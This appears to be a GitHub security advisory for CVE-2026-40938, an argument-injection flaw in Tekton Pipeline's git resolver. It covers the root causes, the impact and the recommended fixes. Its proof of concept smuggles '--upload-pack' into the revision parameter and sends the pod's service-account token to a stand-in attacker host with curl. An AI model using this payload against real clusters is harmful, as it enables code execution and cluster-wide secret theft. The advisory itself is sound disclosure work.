# [H] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE

## Summary
Severity: High
Advisory: GHSA-94jr-7pqp-xhcq
CVE: CVE-2026-40938
CWE: CWE-88
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-21
Source: https://github.com/advisories/GHSA-94jr-7pqp-xhcq
Type: github-advisory

## Affected
- Go: `github.com/tektoncd/pipeline` — affected >=1.10.0 <1.11.1
- Go: `github.com/tektoncd/pipeline` — affected >=1.7.0 <1.9.3
- Go: `github.com/tektoncd/pipeline` — affected >=1.4.0 <1.6.2
- Go: `github.com/tektoncd/pipeline` — affected >=1.2.0 <1.3.4
- Go: `github.com/tektoncd/pipeline` — affected >=1.0.0 <1.0.2

## Details
## Summary

The git resolver's `revision` parameter is passed directly as a positional argument to `git fetch` without any validation that it does not begin with a `-` character. Because git parses flags from mixed positional arguments, an attacker can inject arbitrary `git fetch` flags such as `--upload-pack=<binary>`. Combined with the `validateRepoURL` function explicitly permitting URLs that begin with `/` (local filesystem paths), a tenant who can submit `ResolutionRequest` objects can chain these two behaviors to execute an arbitrary binary on the resolver pod. The `tekton-pipelines-resolvers` ServiceAccount holds cluster-wide `get/list/watch` on all Secrets, so code execution on the resolver pod enables full cluster-wide secret exfiltration.

## Details

### Root Cause 1 — Unvalidated `revision` parameter passed to `git fetch`

`pkg/resolution/resolver/git/repository.go:85`:

```go
// pkg/resolution/resolver/git/repository.go lines 84-96
// 'revision' is the raw user-supplied string from the ResolutionRequest param.
// It is passed verbatim as a positional argument to git fetch:
func (repo *repository) checkout(ctx context.Context, revision string) error {
    _, err := repo.execGit(ctx, "fetch", "origin", revision, "--depth=1")
    // When revision == "--upload-pack=/usr/bin/curl", git parses it as the
    // --upload-pack flag, not as a refspec — executing the binary locally.
    if err != nil {
        return fmt.Errorf("fetch: %w", err)
    }
    _, err = repo.execGit(ctx, "checkout", "FETCH_HEAD")
    return err
}
```

`execGit` invokes `exec.CommandContext("git", ...)` — no shell is used, so shell metacharacters cannot be injected. However, git itself parses flags from mixed positional arguments. When `revision = "--upload-pack=/path/to/binary"`, git receives this as the flag `--upload-pack=/path/to/binary`, not as a refspec. `PopulateDefaultParams` (`resolver.go:418–424`) applies only a leading-slash strip and a `containsDotDot` check on the `pathInRepo` parameter; the `revision` parameter receives no validation at all.

### Root Cause 2 — `validateRepoURL` explicitly permits local filesystem paths

`pkg/resolution/resolver/git/resolver.go:154-158`:

```go
// validateRepoURL validates if the given URL is a valid git, http, https URL or
// starting with a / (a local repository).
func validateRepoURL(url string) bool {
    pattern := `^(/|[^@]+@[^:]+|(git|https?)://)`
    re := regexp.MustCompile(pattern)
    return re.MatchString(url)
}
```

Any URL beginning with `/` passes validation and is used directly as the argument to `git clone`. This means a local filesystem path such as `/tmp/some-repo` is a valid resolver URL.

### Exploit Chain

`--upload-pack=<binary>` causes git to execute the specified binary as the upload-pack server when communicating with the remote. For local-path remotes (`/path`), git invokes the binary on the resolver pod itself with the repository path as its sole argument. Because the argument is passed via `exec.Command` as a single `--upload-pack=<binary>` string (not split by a shell), only binaries at known paths can be invoked — but several useful binaries exist in the resolver pod image (e.g., `/bin/sh`, `/usr/bin/curl`, `/bin/cp`).

Attack complexity is High because the exploit requires either:
- A valid git repository at a known, predicable path on the resolver pod (e.g., `/tmp/<reponame>-<suffix>` from a concurrent resolution), or
- A default-URL configuration pointing at a local path

## PoC

```bash
# Step 1: Set up a local git repository to serve as the "origin"
# (in a real attack, the attacker would time this against a concurrent clone
# or use any pre-existing git repo path on the resolver pod)
git init /tmp/localrepo && cd /tmp/localrepo && git commit --allow-empty -m "init"

# Step 2: Craft a ResolutionRequest with injected --upload-pack flag
kubectl create -f - <<'EOF'
apiVersion: resolution.tekton.dev/v1beta1
kind: ResolutionRequest
metadata:
  name: revision-injection-poc
  namespace: default
  labels:
    resolution.tekton.dev/type: git
spec:
  params:
    - name: url
      value: /tmp/localrepo
    - name: revision
      value: "--upload-pack=/usr/bin/curl http://c2.attacker.internal/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0)"
    - name: pathInRepo
      value: README.md
EOF

# The resolver pod executes:
# git -C <tmpdir> fetch origin \
#   "--upload-pack=/usr/bin/curl http://c2.attacker.internal/..." \
#   --depth=1
#
# For single-argument binaries (/bin/sh, /usr/bin/env, etc.):
# git -C <tmpdir> fetch origin "--upload-pack=/bin/sh" --depth=1
# Executes /bin/sh with the local repository path as argv[1].
# From /bin/sh, the attacker can use a pre-staged script (e.g., written
# via a workspace volume) to achieve arbitrary command execution.
```

**Verified**: `git fetch origin --upload-pack=/tmp/test-exec.sh --depth=1` executes `test-exec.sh` on the local machine even when `origin` is a local filesystem path. Exit code 0 was observed with the test binary executed successfully.

## Impact

- **Code execution on the resolver pod** when an attacker can stage or predict a valid git repository path in `/tmp` on the resolver pod.
- **Full cluster-wide Secret exfiltration**: The `tekton-pipelines-resolvers` ServiceAccount is bound to a ClusterRole that grants `get/list/watch` on all Secrets in all namespaces (`config/resolvers/200-clusterrole.yaml`). Code execution on the resolver pod is therefore equivalent to reading every Secret in the cluster.
- **Privilege escalation**: Secrets typically include kubeconfig files, cloud provider credentials, and API tokens — reading them enables lateral movement to cloud infrastructure.
- Both the deprecated resolver (`pkg/resolution/resolver/git/`) and the current resolver (`pkg/remoteresolution/resolver/git/`) share the same `validateRepoURL`, `PopulateDefaultParams`, and `checkout` implementation via the shared `git` package. Both are affected.

## Recommended Fix

**Fix 1 — Validate that `revision` does not begin with `-`** in `PopulateDefaultParams`:

```go
if strings.HasPrefix(paramsMap[RevisionParam], "-") {
    return nil, fmt.Errorf("invalid revision %q: must not begin with '-'", paramsMap[RevisionParam])
}
```

**Fix 2 — Restrict `validateRepoURL` to remote URLs only** (remove local-path support in production builds, or add an explicit admin opt-in feature flag):

```go
func validateRepoURL(url string) bool {
    pattern := `^([^@]+@[^:]+|(git|https?)://)`
    re := regexp.MustCompile(pattern)
    return re.MatchString(url)
}
```

Applying Fix 1 alone is sufficient to prevent the argument injection. Fix 2 eliminates the enabling condition (local-path remotes for which `--upload-pack` runs locally) and reduces attack surface further.

## References
- https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq
- https://nvd.nist.gov/vuln/detail/CVE-2026-40938
- https://access.redhat.com/errata/RHSA-2026:17546
- https://access.redhat.com/errata/RHSA-2026:24359
- https://access.redhat.com/errata/RHSA-2026:24484
- https://access.redhat.com/errata/RHSA-2026:26519
- https://access.redhat.com/errata/RHSA-2026:26538
- https://access.redhat.com/security/cve/CVE-2026-40938
- https://bugzilla.redhat.com/show_bug.cgi?id=2460292
- https://github.com/tektoncd/pipeline
- https://github.com/tektoncd/pipeline/releases/tag/v1.11.1
- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-40938.json
